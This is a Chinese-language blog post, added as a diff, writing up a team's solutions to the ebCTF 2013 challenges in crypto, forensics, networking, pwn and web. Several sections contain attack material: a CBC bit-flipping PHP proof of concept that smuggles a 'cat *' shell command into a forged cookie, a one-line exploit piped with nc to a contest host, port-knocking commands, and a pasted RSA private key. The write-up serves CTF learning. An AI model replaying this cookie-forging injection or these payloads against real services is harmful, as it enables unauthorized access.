@@ -1,0 +1,423 @@
+---
+layout: post
+title: "ebCTF 2013 Writeup"
+date: 2013-11-08 20:56
+comments: true
+categories: [ctf, wargame, writeup]
+---
+
+拖超久的 writeup ，感謝一起玩的 [217](http://ctftime.org/team/5160) 大大們，下面整理了一些大大們的解法，和從各處搜括來的 writeup
+
+## BIN100
+
+擲骰子要丟出指定的順序，不過最後一個是 7 ，所以 patch 一下判斷數字的 je/jne 就可以了。
+
+### Reference
+
+- <http://balidani.blogspot.hu/2013/08/ebctf-bin100-300-write-up.html>
+
+## BIN200
+
+### Reference
+
+- <http://balidani.blogspot.hu/2013/08/ebctf-bin100-300-write-up.html>
+
+## BIN300
+
+```
+$ gdb
+(gdb) file moon
+(gdb) b luaL_loadbuffer
+Breakpoint 1 at 0x411110
+(gdb) r
+Breakpoint 1, 0x0000000000411110 in luaL_loadbuffer ()
+(gdb) x/3s $rsi
+0x627340 <content.2593>:    "p = 54111037\ng = 56321\n\nio.write(\"Enter your password: \")\nio.flush()\npassword=io.read()\nif string.len(password) ~= 32 then\n    print(\"Wrong!\")\n    return 0\nend\n\nv = g\nalpha = \"0123456789abcdef\"\nfor lo"...
+0x627408 <content.2593+200>:    "op =1,32 do\n    v = v * g\n    v = v % p\n    r = v % 16\n    good = string.sub(alpha,r+1,r+1)\n    if good ~= string.sub(password,loop,loop) then\n        print(\"Wrong!\")\n        return 0\n    end\nend\nprin"...
+0x6274d0 <content.2593+400>:    "t(\"Well done, the flag is: ebCTF{\"..password..\"}\")\n-- f02233aca4839124ee6ffa766883c47e\n"
+```
+
+### Reference
+
+- <http://balidani.blogspot.hu/2013/08/ebctf-bin100-300-write-up.html>
+
+## BIN400
+
+題目是要生出 5 個 MD5 一樣的 console executable PE32 ，分別會印出：
+
+- File1: All Eindbazen are wearing wooden shoes
+- File2: All Eindbazen live in a windmill
+- File3: All Eindbazen grow their own tulips
+- File4: All Eindbazen smoke weed all day
+- File5: All Eindbazen are cheap bastards
+
+所以做 md5 collision ，原本檔案的內容是對自己做簡單的 hash 再從 hash 決定要印哪一句：
+
+```
+// by seanwu
+##include <stdio.h>
+const char* str[5]= {
+    "All Eindbazen are wearing wooden shoes",
+    "All Eindbazen live in a windmill",
+    "All Eindbazen grow their own tulips",
+    "All Eindbazen smoke weed all day",
+    "All Eindbazen are cheap bastards"
+};
+int main(int argc,char **argv){
+    FILE* f=fopen(argv[0],"rb");
+    fseek(f,-20005,SEEK_END);
+    int x=0;
+    unsigned char z;
+    for( int i=0; i<20000; i++ ){
+        fread(&z,1,1,f);
+        x=(x*33331+z)%5;
+    }
+    x=(x+5)%5;
+    puts(str[x]);
+    return 0;
+}
+```
+
+### Reference
+
+- <http://www.mscs.dal.ca/~selinger/md5collision/>
+- <http://www.woodmann.com/forum/archive/index.php/t-10096.html>
+
+## CRY100
+
+- 1st PART
+
+    原文在 <http://en.wikipedia.org/wiki/Klomp> ，用原文來解對應。
+
+- 2nd PART
+
+    用的是 ADFGVX cypher 用的 key 是 'CARGO' ，可以到 <http://www.cryptool-online.org/index.php?option=com_cto&view=tool&Itemid=91&lang=en> 做完之後再找一下對應：
+
+```
+$ echo 'KZUJJUN06TR3T2T6ABTEAB163A3NREE1JZ6N3QFLIYHMP X7V6C6TUK53TZ653N2UNRB316WE11VZ3UV3AKKZUJJ3RV 6D6SZ6J32S11D353TDVZUN0UK68U2N6V23312T33V646N VE4VA36NJZ6N3NSAB3TQFLIYHMPX78UNRT30ETRKBTEAF QQ8U16J6VEV63KHQ8U164ES1U216W3TLL8U16EJJ13KFI Y8U1613386N3K346NRJETV62VZ321E0B4F4Q7' | tr -d ' ' | tr KZUJN06TR32ABEQFLIYHMPX7VC54 shipngordefmba0123456789tjvc
+
+shippingorderfrombramb1oemendaa1phone0123456789tojorisverhovenfindbe1oWa11theitemsshippedtoDoShopefS11DeverDthingiso8ifnotfee1freetocontactmeonphonenSmber01234567898indregardsbram1008i1opotatoes508i1ocaS1if1oWer228i1oapp1es1348i1o1ee8onesecondpartofthef1agbc1c09
+```
+
+- 3rd PART
+
+    `base64` 之後猜測可能是被 `xor` 過後的 `jpeg` ，找出 `xor` key 之後 flag 在圖片裡。
+
+- 4th PART
+
+    切開之後直的看就是了！
+
+```
+$ echo 'thhneu hpeitr eafnw frleo otata uoghb rfirf ttseo' | tr ' ' $'\n'
+
+thhneu
+hpeitr
+eafnw
+frleo
+otata
+uoghb
+rfirf
+ttseo
+```
+
+- 5th PART
+
+    人眼找對應：
+
+```
+$ cat 5.txt | tr "[:lower:]" "[:upper:]" | tr SIWZGDRYUOMKQBTJPNFEHLX aistheflgbuprodywmcknxv
+
+a common mistake made by foreigners is that the netherlands legaliAed the use of cannabis and other recreational soft drugs. according the law any use of drugs is still illegal, but there is a tolerancy policy called gedoogbeleid for any soft drugs. this is a set of guidelines telling public prosecutors under which circumstances offenders should not be prosecuted. according to current gedoogbeleid the possession of a maximum amount of five grams cannabis for personal use is not prosecuted. cultivation is treated in a similar way. cultivation of 5 plants or less is usually not prosecuted when they are renounced by the cultivator.  so if you come to the netherlands and want to try some recreational use of soft drugs, beware that it is not legal. the fifth part for the flag is ab1fde
+```
+
+- 6th PART
+
+    Caesar cipher with shift = 4
+
+```
+$ cat 6.txt | tr "[:upper:]" "[:lower:]" | tr abcdefghijklmnopqrstuvwxyz wxyzabcdefghijklmnopqrstuv
+
+the delta works is a series of construction projects in the southwest of the netherlands to protect a large area of land around the rhine-meuse-scheldt delta from the sea. the works consist of dams, sluices, locks, dikes, levees, and storm surge barriers. the aim of the dams, sluices, and storm surge barriers was to shorten the dutch coastline, thus reducing the number of dikes that had to be raised.
+along with the zuiderzee works, delta works have been declared one of the seven wonders of the modern world by the american society of civil engineers. the last part of the flag is: one-five-f-three-four-}
+```
+
+## CRY200
+
+聽大大說是要去對一堆 n 去做 gcd ，分解出其中一組質數 p, g ，接著再去暴力試出 e, d
+
+### Reference
+
+- <http://hexpresso.wordpress.com/2013/08/04/ebctf-2013-cry200-one-to-many-write-up/>
+
+## CRY300
+
+### Reference
+
+- <http://pastebin.com/vsUZW2WF>
+
+## CRY400
+## FOR100
+
+先 `strings` 發現
+
+    eindbazen@eindbazen:~$ python2 ctf.py ' i hide my '
+
+感覺就是他了！所以試著 `grep ctf.py` 沒東西之後，再試了 `grep sys.argv` 會找到一段 `python` code
+
+```
+import sys
+import time
+import random
+import signal
+from Crypto.Cipher import AES
+key1 = "is this where"
+key2 = sys.argv[1]
+key3 = raw_input("Password: ")
+iv = 'a very random iv'
+secret = './flag'
+mode = AES.MODE_CBC
+def encrypt(signum, frame):
+    key = key1 + key2 + key3
+    enc = AES.new(key, mode, iv)
+    inp = raw_input("Enter secret: ")
+    diff = len(inp) % 16
+    if diff != 0:
+    inp += ' ' * (16 - diff)
+    with open(secret, 'wb') as outfile:
+        outfile.write(enc.encrypt(inp))
+    del key, enc
+def decrypt(signum, frame):
+    key = key1 + key2 + key3
+    enc = AES.new(key, mode, iv)
+    with open(secret, 'rb') as infile:
+        print(enc.decrypt(infile.read(48)))
+    del key, enc
+signal.signal(signal.SIGUSR1, encrypt)
+signal.signal(signal.SIGUSR2, decrypt)
+while True:
+    time.sleep(1)
+```
+
+接著要找 `key3` ，試著 `grep 'i hide my'` 之後找到一行
+
+    is this where i hide my secrets?
+
+拿他當 key 跑 AES decrypt 就拿到 flag 了！
+
+## FOR200
+
+### Reference
+
+    < Guest10733> how did u get sms in for200 ?
+    <@gijs> Guest10733: the SMS is stored in inbox.txt but in some binary format that is also used to transmit sms over the network
+    < cr0n> Guest10733: sms pdu: http://www.smartposition.nl/resources/sms_pdu.html
+
+## FOR300
+
+### Reference
+
+## FOR400
+
+## NET100
+
+從給的 `net-100.pcap` 裡可以找到一個有密碼的 `rookit.zip` ，發現裡面有 flag ，接著就是要找解壓縮密碼了，密碼可以在一連串的 udp packet 中找到！
+
+### Reference
+
+- <http://blog.lse.epita.fr/articles/56-ebctf-2013-network-challenges-net100-net200-net300.html>
+
+## NET200
+
+這題一開始只給了 `112 + 386 + 712 + 1398 + 8771 + 11982 + 15397 + 23984 = 51037` ，連到網頁看到了 `X-Powered-By:*knock knock*` ，猜測是要做 port knocking ！
+
+```
+$ nc -w 1 54.216.81.14 112;
+$ nc -w 1 54.216.81.14 386;
+$ nc -w 1 54.216.81.14 712;
+$ nc -w 1 54.216.81.14 1398;
+$ nc -w 1 54.216.81.14 8771;
+$ nc -w 1 54.216.81.14 11982;
+$ nc -w 1 54.216.81.14 15397;
+$ nc -w 1 54.216.81.14 23984;
+$ nc -w 1 54.216.81.14 51037;
+So you are knocking me, how about I return the favor?
+Repeat after me and I will open the last port…
+```
+
+下一階段的提示是要照著對方敲我們 port 的順序敲回去，我們是利用 `iptables` 來把進來的 tcp connection 記錄下來：
+
+```
+# iptables -A INPUT -p tcp -j LOG --log-prefix ' INPUT TCP ' --log-level 4
+```
+
+接著會在 `/var/log/kern.log` 拿到記錄，接著再敲回去：
+
+```
+$ nc -w 1 54.216.81.14 8112;
+$ nc -w 1 54.216.81.14 33386;
+$ nc -w 1 54.216.81.14 14712;
+$ nc -w 1 54.216.81.14 4398;
+$ nc -w 1 54.216.81.14 1771;
+$ nc -w 1 54.216.81.14 52313;
+$ nc -w 1 54.216.81.14 25697;
+$ nc -w 1 54.216.81.14 932;
+$ nc -w 1 54.216.81.14 22222;
+[Advanced]
+        sequence    = 234,781,983,2411,9781,14954,23112,63991
+        seq_timeout = 15
+        command     = /sbin/iptables -A INPUT -s %IP% -p tcp --dport 32154 -j ACCEPT
+        tcpflags    = fin,urg,!ack
+        cmd_timeout = 30
+        stop_command = /sbin/iptables -D INPUT -s %IP% -p tcp --dport 32154 -j ACCEPT
+```
+
+拿到第三階段的提示了！查了一下發現是 [knockd](http://www.zeroflux.org/projects/knock/) 的設定檔，這次會檢查 tcp flags ，我們是用 (hping)[http://www.hping.org/] 來設 tcp flags
+
+```
+hping3 -c 1 -F -U -p 234   54.216.81.14
+hping3 -c 1 -F -U -p 781   54.216.81.14
+hping3 -c 1 -F -U -p 983   54.216.81.14
+hping3 -c 1 -F -U -p 2411  54.216.81.14
+hping3 -c 1 -F -U -p 9781  54.216.81.14
+hping3 -c 1 -F -U -p 14954 54.216.81.14
+hping3 -c 1 -F -U -p 23112 54.216.81.14
+hping3 -c 1 -F -U -p 63991 54.216.81.14
+```
+
+最後再連 port 32154 就會噴 flag 了！
+
+### Reference
+
+    < ai1> Ghaaf, the final one:
+
+        nmap -vvv -PN --scanflags FINURG 54.216.81.14 -r -p234,781,983,2411,9781,14954,23112,63991 --scan-delay 1
+
+    < Tilou> http://pastebin.com/jBr3d9wR <- hping way
+
+        #!/bin/bash
+        sequence="234 781 983 2411 9781 14954 23112 63991"
+        for port in $sequence; do
+            hping -F -U -c 1 -p $port 54.216.81.14 > /dev/null 2>&1
+        done
+        nc 54.216.81.14 32154
+
+- <http://ufologists.ufoctf.ru/49/write-ups/ebctf-2013-net200-whos-there-write-up>
+- <http://blog.lse.epita.fr/articles/56-ebctf-2013-network-challenges-net100-net200-net300.html>
+
+## NET300
+
+### Reference
+
+- <http://blog.lse.epita.fr/articles/56-ebctf-2013-network-challenges-net100-net200-net300.html>
+
+## NET400
+
+### Reference
+
+## PWN100
+
+### Reference
+
+    <@gijs> foundation: pwn100 initial key https://p.6core.net/p/yMz8naU2ZphAAHWjGkY7ICcD
+
+    -----BEGIN RSA PRIVATE KEY-----
+    MIIEoAIBAAKCAQEA8Ew1BzA3rNBwrFYevJ6mJMVfe+ZMrbrq20Q78MIprjxMmEV8
+    hUiYq4CftCeNj+XxYYuaYLwAA8GfW+wrS04AAEzHTNwc1wKbHdOzvParhiIFOjJ2
+    NX/ljlQA7LCO0bToMg971gKrFGYPGMa5vKsx9hXyDCLegXHV3G/duPxaG0hkYucC
+    UrilqtGMFmpFQu+vgDdudEEVg+01BtNanCxOeYuWLnd8ViZx3qrdooPNnhxh1hop
+    ciYNp5ORQiYKFFCmIxAMRnXYlZt5CbPIbNrRLHKSnrDyOhSLa0e3tjnGYv+YjrHB
+    OaWQoPu3dOu88ason5jhbTKzZ2gOe24vlg9hdwIBIwKCAQApMaKwxm/xvVUk25A9
+    l4oyMHbEyGTqlRJReWlceQ51o+/fluIleijM8Xp2p7HeJ2s1SyHHcK+LnYkIcaEF
+    mFfFiYFAYD91UOdkMuucvJJuxADlZ7x+My6qr1Cdmpwj8yB9nEEdX4sKz6rRDB/X
+    M0pks04QtYU6ww64Ey1S6W6IVTh/6TNzPc2mEBtHJd7yDI08aY0fbIOf5z4WNPBE
+    oEYIu6FWTMDf57XaUPclrPNnCturWcAdzw1DgYiyuDaS4YtryDfyaBA+WbepEOEb
+    HFkMf6jgDfqpnGc+vL8Z3ggoftOHZPdS3NNScrR1zRZbRyLP6DNRPjmIldThIrdv
+    fb+LAoGBAPzFhrlH84GwoZs+Hd/YFYgQxySGEqSspp6x14wv+7eseUN8Vp/+A11Z
+    kZfRHrZU5r5eTIlo+ajXeX8Uu04U5A0X3mFXpfsGksPuEvVPPzCHwHIvfsDl2u/3
+    ymStMDg2DHbAnyncLYUVVMjAVudL7MDq3fz1T44gfAcj+/jQOgwBAoGBAPNd5UeV
+    MfRcJ1G5RNDm5kTkXegMNXEH1wF+HFTb3v5Ey9A6tnc+Bhpg66QgSYtwIPdll2oF
+    9Jdw+8oa4tL785ZrzGSTcNQjUrBsE7H/dkPbyXH+4KXMKUEwME2cz7PrZKU4RZ9P
+    b+WACdIFaH3mn3H38GPIotWqLK2LfQi7d813AoGAVqofj/tpbkswF/gKPh4zRJgJ
+    w2Eq9qGYNmjcMBBzj25VdjlCRXupYdWRANn75r4F+CBUwWXR8L7n08yX/YOBY5Mn
+    rFiQrdZeNIwjwdIHCVMdaPpXWBRLEHI2w26UMIePPqhxFaqTQ5JI9F8zvQQWqIsK
+    SBmXnnGJnAxWY++e34sCgYB2NOu1DfOxNBMZENhINaMLhN0nkObB3zyLskhGeWxP
+    ncIUrs2nochzNmPTYCO4wW8ZFBZYEYVuIO9TiWbbgbDUCHk4KltfuWKtdlK1irXJ
+    MD1F/3RtyZBhfc5RlU7w/U4kXSkhflrr0HnMaQbeEO5b7XTCwIma+uKALc8EPcx5
+    vQKBgBCqEbKrfUF5H1QQunHiIsRE40zJ8MaGZbdT7ZC/bXTcwFnC+m3Ql/Iko3KU
+    qJ59EAryB5SmrpViNlhl3JL+Pu2m4fNhvxVfBdNSxuJMjodK6n2O4WeF0NUS0bpZ
+    EZRema+mBXD/lSTh1d9FnEOwrbFFEnuTZfAnEvEFo1m/Qn43
+    -----END RSA PRIVATE KEY-----
+
+
+## PWN200
+
+    $ perl -e 'print ">"x51 . "-"x47 . "\ncat IM_A_FLAG\n"' | nc 176.34.95.148 31313
+
+## PWN300
+
+### Reference
+
+    < gna_> pwn300 writeup
+    < gna_> http://pastebin.com/G0KvW6t6
+    < bata_> pwn300 http://pastebin.com/gc8u6J3M
+
+- <http://haxx.in/ebctf_pwn300_sploit.php.txt>
+- <http://blog.lse.epita.fr/articles/57-ebctf-2013-pwn300.html>
+
+## PWN400
+
+### Reference
+
+- <http://blog.lse.epita.fr/articles/58-ebctf-2013-clownstoragenet---dimwit---pwn-400.html>
+
+## WEB100
+
+### Reference
+
+    <@gijs> loveldyream: this is what i developed when i tested it
+            https://p.6core.net/p/0lAkDRAsvPqj1zeMVz6A5xcl> using blind
+            injection but i know the author has a one-liner which will
+            return the value directly without using blind injection
+
+- <http://hardc0de.ctf.su/archives/46>
+
+## WEB200
+
+### Reference
+
+- <http://hardc0de.ctf.su/archives/11>
+
+## WEB300
+
+### Reference
+
+    < daniel1024> xpath injection in web100?
+    < daniel1024> *300
+    <@gijs> daniel1024: yes xpath injection
+    < RlIxOTA4> web300 was xpat
+    < RlIxOTA4> h
+
+## WEB400
+
+這題很有趣！雖然我們沒有解出來 XD
+
+一開始要利用 `function hmac($data)` 裡的 typo 讓我們可以假造合法的 cookie ，
+接著再利用 AES CBC mode 解密時會和前一個 block 做 xor 的特性，
+只要知道某一段 plaintext 是什麼，就可以在 ciphertext 中 xor 前一個 block ，
+讓解出來的 plaintext 變成我們想要的（超抽象 XD ）
+
+沒有寫完整 writeup ，有興趣的人可以看下面的 reference 研究一下 PoC ！
+
+### Reference
+
+    < phiber_> web400 solution http://privatepaste.com/1d0f3254f6
+
+    <?php
+    $a = base64_decode(urldecode('%2FW8w%2BUpwN%2B2vh85b54XcyGM2wSNNFFcBqoGr%2BX5S7FOuJn%2FJBJwp1R1F5VpqsR9NkW82Ut8L5hPFKa%2BWIEs2W9DP9Qnq9zhmAJ5FwbNcY6viYT2kZd1Yz06lplcsnRuaFU8gj5TV9jHX8wps2%2BTaAO68TrHgF3Scvt56BrGAlZX%2Fp24qGKQf5m%2B15RdsgC6M%2BQ9Fl7KhwazU1F9yJ9rx7GH5HsCC4ztYeVVoiFYQQIDMPMHZkIeA7sbYrhH6L9Ej8DlEb2dErkHBVP98Wp5aAxm8jIXeqgBHfPF8s26o%2Bjs2T6XfWm3cv%2FN4yp93yGEpSja7dAr1Bdw3k1TVVPAqzGFBA2SbB6skHQhNiC5hfJ4TdymBfzzt8QLvGT3KKBlQP1sgNcLIpwhFCOGlGkN1Nq7%2Bb2GV5h%2FtyLH%2FTW2LGuVcBCTRXFY7mC0IPV2WCFSTyOddnX5t2sNeU9zBop9WeWQe199f50%2FRKRX4aA%2FLsSrGqv%2F2s4z96n9I0Zu4oGcpb9hGh3zvzGZQy6J4TAeKRKCRsIW3vDFacngSGcUAklS4nsRqXJBVEZ70WcBFQjVI7zMX8cjJS8RiyQLKgGpKirYotsetFk98xonYzbwBnyNLiNFEM0WSsPoDSW2UvQe3NfDEJKwT63l9uaAHTbfWXQ%3D%3D'));
+    $blocks = str_split($a, 16);
+    $blocks[22] = $blocks[22] ^ str_repeat('a', 16) ^ "';cat *; echo 'a";
+    $b = implode('', $blocks);
+    echo urlencode(base64_encode($b))."\n";
+    ?>
+
+- <http://hardc0de.ctf.su/archives/43>
